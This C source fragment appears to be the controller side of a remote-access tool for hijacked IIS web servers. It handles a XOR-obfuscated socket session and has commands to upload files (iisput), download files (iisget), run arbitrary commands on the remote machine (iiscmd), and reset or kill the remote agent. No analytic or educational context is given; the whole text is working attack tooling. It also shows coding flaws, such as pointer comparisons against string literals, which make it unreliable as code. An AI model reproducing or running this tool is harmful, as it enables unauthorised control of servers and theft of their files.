

void shellcmd(int fd)
{

  int   i,j,k,l;
  char  recvbuff[BUFFSIZE];
  char  buff[BUFFSIZE];

  lockintvar1=LOCKBIGNUM2%LOCKBIGNUM;
  lockintvar2=lockintvar1;
  xordatabegin=0;

  


     k=0;
     ioctlsocket(fd, FIONBIO, &k);

     j=0;
    // while(j==0)
	// {
	     k=newrecv(fd,recvbuff,BUFFSIZE,0);
         if(k>=8&&strstr(recvbuff,"XORDATA")!=0) {
		    xordatabegin=1;
            sprintf(buff,"\r\nok!recv %d bytes\r\n",k);
			strout(buff);
			recvbuff[k]=0;
			sprintf(buff,"\r\nrecv:%s\r\n\r\n",recvbuff);
      	    strout(buff);
            k=-1;
			j=1;
		 }
	     if(k>0){
	 	    recvbuff[k]=0;
		    strout("\r\nrecv:\r\n");
            strout(recvbuff); 
			strout("\r\n");
		 }
		 else
		 {
             i=WSAGetLastError();
		     if(k==0||i==0x2746||i==0x2745)
			 {
                strout("\r\nserver close!\r\n");
			    exit(1);  
			 }
         }
	// }

  

     k=1;
     ioctlsocket(fd, FIONBIO, &k);

 
  k=1;
  l=0;
  while(k!=0)
  {
	  if(k<0)
	  {

		  l=0;
          i=0;
	//	  while(i==0){
			  buff[0]=0;
              j=strin(buff,sizeof(buff));

			  if(memcmp(buff,"iisexit",7)==0)
			  {
				     strout("\r\nClose server!\r\n");
					 Sleep(1000);
		  	         exit(0);
			  }
			  if(memcmp(buff,"iisput",6)==0){
		  	         iisput(fd,buff+6);
					 i=2;
			  }
              if(memcmp(buff,"iisget",6)==0){
		  	         iisget(fd,buff+6);
					 i=2;
			  }
              if(memcmp(buff,"iiscmd",6)==0){
    	             iiscmd(fd,buff+6);
					 i=2;
              }
/*            if(memcmp(buff,"iish",4)==0){
		  	         iishelp();
					 i=2;
			  }
              if(memcmp(buff,"iisreset",8)==0){
    	             iisreset(fd,buff+6);
					 i=2;
              }
              if(memcmp(buff,"iisdie",6)==0){
    	             iisdie(fd,buff+6);
					 i=2;
              }

*/
		//	  if(i==2)i=0;
		//	  else i=1;

  //        }
	

		  k=strlen(buff);
		  if(i!=2&&j>=0)
		  {	  
             memcpy(buff+k,SRLF,3);
	         newsend(fd,buff,k+2,0);
		  }

      }
	  k=newrecv(fd,buff,BUFFSIZE,0);
/*      if(xordatabegin==0&&k>=8&&strstr(buff,"XORDATA")!=0) {
		  xordatabegin=1;
          k=-1;
	  }
*/
	  if(k>0)
	  {
          l=0;
		  buff[k]=0;
		  strout(buff);

      }
      else
	  {
		  Sleep(20);
		  if(l<20) k=1;
          ++l;  
      }


  }
}


void iisput(int fd,char *str){
 
 char *filename;
 char *filename2;
 FILE *fpt;
 char buff[0x2000];
 int size=0x2000,i,j,filesize,filesizehigh;

 filename="\0";
 filename2="\0";
 j=strlen(str);
 for(i=0;i<j;++i,++str){
	 if(*str!=' '){
		 filename=str;
         break;
     } 
 }
 for(;i<j;++i,++str){
	 if(*str==' ') {
		 *str=0;
		 break;
     }
 }
 ++i;
 ++str;
 for(;i<j;++i,++str){
	 if(*str!=' '){
	   filename2=str;
       break;
     }
 }
 for(;i<j;++i,++str){
	 if(*str==' ') {
		 *str=0;
		 break;
     }
 }


 if(filename=="\x0") {
     strout("\r\n iisput filename [path\\fiename]\r\n");	 
	 return;
 }
 if(filename2=="\x0") filename2=filename;
 
 outprintf("\r\n begin put file:%s",filename);

 j=0;
 ioctlsocket(fd, FIONBIO, &j);


 Sleep(1000);
 
 fpt=CreateFile(filename,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0); 

 filesize=GetFileSize(fpt,&filesizehigh);
 strcpy(buff,"put ");
 *(int *)(buff+4)=filesize;
 filesize=*(int *)(buff+4);
 strcpy(buff+0x8,filename2);
 newsend(fd,buff,i+0x9,0);
 outprintf("\r\n put file:%s to file:%s %d bytes",filename,filename2,filesize);
 Sleep(1000);

 while(filesize>0){
	  size=0x800;
      ReadFile(fpt,buff,size,&size,NULL); 
      if(size>0){
          filesize-=size;
		  newsend(fd,buff,size,0);
//	      Sleep(0100);
	     
      }
 }

// size=filesize;
// ReadFile(fpt,buff,size,&size,NULL); 
// if(size>0) send(fd,buff,size,0);

 CloseHandle(fpt);
 j=1;
 ioctlsocket(fd, FIONBIO, &j);
 
 outprintf("\r\n put file ok!\r\n");
 Sleep(1000);
 

}



void iisget(int fd,char *str){
 
 char *filename;
 char *filename2;
 FILE *fpt;
 char buff[0x2000];
 int size=0x2000,i,j,filesize;  //,filesizehigh;

 filename="\0";
 filename2="\0";
 j=strlen(str);
 for(i=0;i<j;++i,++str){
	 if(*str!=' '){
		 filename=str;
         break;
     } 
 }
 for(;i<j;++i,++str){
	 if(*str==' ') {
		 *str=0;
		 break;
     }
 }
 ++i;
 ++str;
 for(;i<j;++i,++str){
	 if(*str!=' '){
	   filename2=str;
       break;
     }
 }
 for(;i<j;++i,++str){
	 if(*str==' ') {
		 *str=0;
		 break;
     }
 }


 if(filename=="\x0") {
     outprintf("\r\n iisget filename [path\\fiename]\r\n");	 
	 return;
 }
 if(filename2=="\x0") filename2=filename;
 
 outprintf("\r\n begin get file:%s",filename);
 
 fpt=CreateFileA(filename,FILE_FLAG_WRITE_THROUGH+GENERIC_WRITE,FILE_SHARE_READ,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,0); 

 strcpy(buff,"get ");
 strcpy(buff+0x4,filename2);
 newsend(fd,buff,i+0x5,0);
 outprintf("\r\n get file:%s from file:%s",filename,filename2);
 
  j=0;
  ioctlsocket(fd, FIONBIO, &j);

 i=0;
 filesize=0;



 j=0;
 while(j<100){
 
//    Sleep(100);
    i=newrecv(fd,buff,0x800,0);
    if(i>0){
		buff[i]=0;
		if(memcmp(buff,"size",4)==0){
			filesize=*(int *)(buff+4);
            j=100;
        }
		else {
			
/*			  for(j=0;j<i;++j){
                lockintvar1=lockintvar1*0x100;
				lockintvar1=lockintvar1%LOCKBIGNUM;
				lockcharvar=lockintvar1%0x100;
                buff[j]^=lockcharvar;   // DATAXORCODE;
			  }
*/
			  j=0;
 			  outprintf("\r\n recv %s",buff);
		}
	}
	else ++j;
//	if(j>1000) i=0;
 }
 outprintf("\r\n file %d bytes %d\r\n",filesize,i);
 if(i>8){
	  i-=8;
      filesize-=i;
      WriteFile(fpt,buff+8,i,&i,NULL);
     
 }
 
 while(filesize>0){
	      size=newrecv(fd,buff,0x800,0);
          if(size>0){
             filesize-=size;
             WriteFile(fpt,buff,size,&size,NULL); 
          
		  }
		  else {
			  if(size==0) {
               outprintf("\r\n ftp close \r\n "); 

			  }
			  else {
				  outprintf("\r\n Sleep(100)");
				  Sleep(100);
              }
          }
 
 }
 CloseHandle(fpt);
 outprintf("\r\n get file ok!\r\n");

 j=1;
 ioctlsocket(fd, FIONBIO, &j);


}


void iisreset(int fd,char *str){

    char buff[0x2000];
	int  i,j;
    outprintf("\nreset xor data.\n");
    Sleep(1000);
    j=0;
    ioctlsocket(fd, FIONBIO, &j);
    strcpy(buff,"reset");
    newsend(fd,buff,strlen(buff),0);
	Sleep(1000);

   

    lockintvar1=LOCKBIGNUM2%LOCKBIGNUM;
    lockintvar2=lockintvar1;


	while(1){
	  j=recv(fd,buff,0x2000,0);
	  if(j>0){
		  buff[j]=0;
		  for(i=0;i<j;++i){
			  if(buff[i]==0) buff[i]='b';
          }
	//	  outprintf("\r\nrecv 0x%x bytes:%s",j,buff);
		  if(strstr(buff,"xordatareset")!=0){
			 outprintf("\r\nxor data reset ok.\r\n");

             for(i=strstr(buff,"xordatareset")-buff+0x0c;i<j;++i){
                lockintvar1=lockintvar1*0x100;
				lockintvar1=lockintvar1%LOCKBIGNUM;
				lockcharvar=lockintvar1%0x100;
                buff[i]^=lockcharvar;   // DATAXORCODE;
			  }
			

			  break;
          }
      }
//	  else if(j==0) break;
//	  strcpy(buff,"\r\nmkdir d:\\test6\r\n");
//      newsend(fd,buff,strlen(buff),0);
	}
	Sleep(1000);
    j=1;
    ioctlsocket(fd, FIONBIO, &j);
//    outprintf("aaa");
}



void iisdie(int fd,char *str){

    char buff[0x200];
	int  j;
    outprintf("\r\niis die.\r\n");
    j=0;
    ioctlsocket(fd, FIONBIO, &j);
    Sleep(1000);
    strcpy(buff,"iisrr ");
    newsend(fd,buff,strlen(buff),0);
	Sleep(1000);
    j=1;
    ioctlsocket(fd, FIONBIO, &j);
    lockintvar1=LOCKBIGNUM2%LOCKBIGNUM;
    lockintvar2=lockintvar1;
}



void iiscmd(int fd,char *str){

	char *cmd="\0";
	char buff[2000];
    int  i,j;

    j=strlen(str);
    for(i=0;i<j;++i,++str){
	  if(*str!=' '){
	 	 cmd=str;
         break;
	  } 
	}
	j=strlen(str);
    for(i=0;i<j;++i){
	   if(*(str+j-i-1)!=' ') {
	  	 break;
	   }
	   else *(str+j-i-1)=0;
	}
  
	if(cmd=="\x0") {
        outprintf("\r\niiscmd cmd\r\n");	 
	    return;
	}
 
    outprintf("\r\nbegin run cmd:%s\r\n",cmd);
    j=0;
    ioctlsocket(fd, FIONBIO, &j);
    Sleep(1000);
    strcpy(buff,"iisc ");
	strcat(buff,cmd);
    newsend(fd,buff,strlen(buff),0);
	Sleep(1000);
    j=1;
    ioctlsocket(fd, FIONBIO, &j);

/*
    lockintvar1=LOCKBIGNUM2%LOCKBIGNUM;
    lockintvar2=lockintvar1;
*/

}




